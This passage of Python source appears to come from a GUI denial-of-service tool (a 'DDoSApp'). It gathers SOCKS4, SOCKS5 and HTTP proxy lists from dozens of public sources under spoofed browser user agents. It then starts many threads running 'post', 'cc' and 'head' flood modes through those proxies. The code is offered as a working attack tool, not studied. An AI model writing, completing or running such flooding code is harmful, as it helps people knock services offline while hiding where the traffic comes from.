                "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
                "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
                "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
                "https://www.proxy-list.download/api/v1/get?type=socks4",
                "https://www.proxyscan.io/download?type=socks4",
                "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
                "https://api.openproxylist.xyz/socks4.txt",
            ]
            
            for api in socks4_api:
                try:
                    r = requests.get(api, timeout=10, headers={"User-Agent": get_realistic_user_agent()})
                    f.write(r.content)
                except:
                    pass
            
            try:
                r = requests.get("https://www.socks-proxy.net/", timeout=10, headers={"User-Agent": get_realistic_user_agent()})
                part = str(r.content)
                part = part.split("<tbody>")
                part = part[1].split("</tbody>")
                part = part[0].split("<tr><td>")
                proxies = ""
                
                for proxy in part:
                    proxy = proxy.split("</td><td>")
                    try:
                        proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
                    except:
                        pass
                
                f.write(bytes(proxies, encoding='utf-8'))
            except:
                pass
    
    elif proxy_ver == "5":
        with open(out_file, 'wb') as f:
            socks5_api = [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
                "https://www.proxy-list.download/api/v1/get?type=socks5",
                "https://www.proxyscan.io/download?type=socks5",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
                "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
                "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
                "https://api.openproxylist.xyz/socks5.txt",
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
                "https://openproxylist.xyz/socks5.txt",
                "https://proxyspace.pro/socks5.txt",
                "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
                "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
                "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
                "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
            ]
            
            for api in socks5_api:
                try:
                    r = requests.get(api, timeout=10, headers={"User-Agent": get_realistic_user_agent()})
                    f.write(r.content)
                except:
                    pass
    
    elif proxy_ver == "http":
        with open(out_file, 'wb') as f:
            http_api = [
                "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
                "https://www.proxy-list.download/api/v1/get?type=http",
                "https://www.proxyscan.io/download?type=http",
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
                "https://api.openproxylist.xyz/http.txt",
                "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
                "http://alexa.lr2b.com/proxylist.txt",
                "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
                "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
                "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
                "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
                "https://proxy-spider.com/api/proxies.example.txt",
                "https://multiproxy.org/txt_all/proxy.txt",
                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
                "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
                "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
                "https://openproxylist.xyz/http.txt",
                "https://proxyspace.pro/http.txt",
                "https://proxyspace.pro/https.txt",
                "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
                "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
                "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
                "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
                "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
                "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
                "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
                "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
                "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
                "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
                "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
                "https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
                "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "https://rootjazz.com/proxies/proxies.txt",
                "https://sheesh.rip/http.txt",
                "https://www.proxy-list.download/api/v1/get?type=https",
            ]
            
            for api in http_api:
                try:
                    r = requests.get(api, timeout=10, headers={"User-Agent": get_realistic_user_agent()})
                    f.write(r.content)
                except:
                    pass
    
    print(f"{red}> Downloaded{reset} proxies list as " + out_file)

def build_threads(mode, thread_num, event, proxy_type):
    if proxy_ver == "5":
        proxy_type = 5
    elif proxy_ver == "4":
        proxy_type = 4
    elif proxy_ver == "http":
        proxy_type = 0
    
    threads = []
    for _ in range(thread_num):
        if mode == "post":
            th = threading.Thread(target=post, args=(event, proxy_type), daemon=True)
        elif mode == "cc":
            th = threading.Thread(target=cc, args=(event, proxy_type), daemon=True)
        elif mode == "head":
            th = threading.Thread(target=head, args=(event, proxy_type), daemon=True)
        else:
            continue
            
        th.start()
        threads.append(th)
    
    return threads

def main():
    root = Tk()
    app = DDoSApp(root)
    root.mainloop()

if __name__ == "__main__":
    bannerm()
    main()
